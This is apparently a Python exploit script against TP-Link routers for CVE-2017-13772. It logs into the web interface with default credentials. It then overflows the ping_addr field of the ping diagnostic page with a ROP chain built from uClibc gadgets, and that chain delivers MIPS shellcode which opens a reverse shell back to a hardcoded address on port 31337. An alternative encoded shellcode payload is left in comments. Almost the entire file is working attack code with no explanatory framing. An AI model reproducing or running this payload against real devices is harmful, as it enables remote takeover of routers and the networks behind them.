#coding=utf-8
#coding=utf-8
import urllib2
import urllib
import base64
import hashlib
import requests
from pwn import *
context.arch="mips"
context.endian="big"

# -*- coding:utf-8 _*-
#https://fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/
# https://paper.seebug.org/434/

import socks, socket

# socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9999)
# socket.socket = socks.socksocket

session=requests.Session()
session.verify=False


"""GET /userRpm/LoginRpm.htm?Save=Save HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.0.1/
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
Upgrade-Insecure-Requests: 1
"""
"""
GET /userRpm/LoginRpm.htm?Save=Save HTTP/1.1
Accept-Encoding: identity
Host: 192.168.0.1
Cookie: Authorization=Base YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
Connection: close
User-Agent: Python-urllib/2.7
"""

payload=        "\x24\x0f\xff\xfa\x01\xe0\x78\x27"+\
            "\x21\xe4\xff\xfd"      +\
            "\x21\xe5\xff\xfd"      +\
            "\x28\x06\xff\xff"      +\
            "\x24\x02\x10\x57"      +\
            "\x01\x01\x01\x0c"      +\
            "\xaf\xa2\xff\xff"      +\
            "\x8f\xa4\xff\xff"      +\
            "\x34\x0f\xff\xfd"      +\
            "\x01\xe0\x78\x27"      +\
            "\xaf\xaf\xff\xe0"

            #/* ================ You can change port here  ================= */
payload+=            "\x3c\x0e\x7a\x69"     # // lui     $t6, 0x7a69 ( sin_port = 0x7a69 )
            #/* ============================================================ */

payload+=            "\x35\xce\x7a\x69"  +\
            "\xaf\xae\xff\xe4"

            #/* ================ You can change ip here  ================= */
payload+=            "\x3c\x0e\xac\x11"      #// lui     $t6, 0xc0a8         ( sin_addr = 0xc0a8 ...
payload+=            "\x35\xce\xdd\x87"      #// ori     $t6, $t6, 0x029d                 ... 0x029d
            #/* ============================================================ */

payload+=            "\xaf\xae\xff\xe6"      +\
            "\x27\xa5\xff\xe2"     +\
            "\x24\x0c\xff\xef"      +\
            "\x01\x80\x30\x27"      +\
            "\x24\x02\x10\x4a"      +\
            "\x01\x01\x01\x0c"      +\
            "\x24\x0f\xff\xfd"      +\
            "\x01\xe0\x28\x27"      +\
            "\x8f\xa4\xff\xff"      +\
            "\x24\x02\x0f\xdf"      +\
            "\x01\x01\x01\x0c"      +\
            "\x24\xa5\xff\xff"      +\
            "\x24\x01\xff\xff"      +\
            "\x14\xa1\xff\xfb"      +\
            "\x28\x06\xff\xff"      +\
            "\x3c\x0f\x2f\x2f"      +\
            "\x35\xef\x62\x69"      +\
            "\xaf\xaf\xff\xec"      +\
            "\x3c\x0e\x6e\x2f"      +\
            "\x35\xce\x73\x68"      +\
            "\xaf\xae\xff\xf0"      +\
            "\xaf\xa0\xff\xf4"      +\
            "\x27\xa4\xff\xec"      +\
            "\xaf\xa4\xff\xf8"      +\
            "\xaf\xa0\xff\xfc"      +\
            "\x27\xa5\xff\xf8"      +\
            "\x24\x02\x0f\xab"      +\
            "\x01\x01\x01\x0c"

# payload=(
#     "\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99"
#     "\x27\xb2\x05\x4b"  # 0x27b2059f for first_exploit
#     "\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9"
#     "\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41"
#     "\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d"
#     "\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71"
#     "\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d"
#     "\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99"
#     "\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5"
#     "\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad"
#     "\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9"
#     "\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1"
#     "\x02\x2a\x18\x26\xae\x43\xff\xc1"
#
#     # sleep
#     "\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08"
#     "\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
#     "\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c"
#
#     ################ encoded shellcode ###############
#     "\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06"
#     "\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff"
#     "\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d"
#     "\x7a\x69"  # &lt;------------------------- PORT 0x7a69 (31337)
#     "\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad"
#     "\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc"
#     "\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01"
#     "\x01\x0c\x24\x0f\x73\x50"
#     "\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f"
#     "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48"
#     "\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f"
#     "\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50"
#     "\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f"
#     "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c"
#     "\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce"
#     "\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8"
#     "\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02"
#     "\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
#     "\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c"
# )
# #                      trash      $s1        $ra


libc_address=0x77f4b000#0x7780e000
#

# libc=ELF("./libuClibc-0.9.30.so")
    # print hex(libc.symbols["pwrite"]+libc_address)

rop1=0x00055C60+libc_address #a0=1  jr $s9
parament_sleep=0x0001E20C+libc_address  # lw $ra,0x28+var_4($sp)                              |  jr    $s1
stack_to_s2=0x000164C0+libc_address  #|  move $t9,$s2                                        |  jalr  $s2
sleep_addr=0x0053090+libc_address
call_s2=0x0003E224+libc_address
def login(ip,user,pwd):
    hash=hashlib.md5()
    hash.update(pwd)
    auth_string="%s:%s" %(user,hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    encoded_string=urllib.quote(" "+encoded_string)
    print(encoded_string)
    headers={"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Referer": "http://192.168.0.1/",
            "Cookie": "Authorization=Basic%s"%encoded_string,
            "Upgrade-Insecure-Requests": "1"}
    params={"Save":"Save"}
    url = "http://" + ip + "/userRpm/LoginRpm.htm"
    resp=session.get(url,params=params,headers=headers,timeout=10)
    url="http://%s/%s/userRpm"%(ip,(resp.text).split("=")[2].split("/")[3])
    cookie="Authorization=Basic%s"%encoded_string
    return url,cookie
def exploit(url,auth):

    exp="a"*164+p32(parament_sleep)+p32(rop1)+"a"*0x1c+p32(sleep_addr)
    exp+="aaaa"*2+"b"*0x18+p32(call_s2)+"aaaa"*2+p32(stack_to_s2)+"a"*0x18+payload
    #"a"*160+s0(不再有用)+rop2+rop1+(sp)"a"*0x18+s0+s1+s2+ra+sp(新的sp)
    print hex(rop1)
    print hex(sleep_addr)

    params={'ping_addr':exp,
            'doType':'ping',
            'isNew':'new',
            'sendNum':'20',
            'pSize':'64',
            'overTime':'800',
            'trHops':'20'}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "close",
               "Referer": "%s"%url,
               "Cookie":  auth,
               "Upgrade-Insecure-Requests": "1"}
    resp=session.get(url,params=params,headers=headers)
    print resp.text



url,auth=login("172.17.221.20","admin","admin")
print url+"/PingIframeRpm.htm"
print auth
exploit(url+"/PingIframeRpm.htm",auth)
# print_info()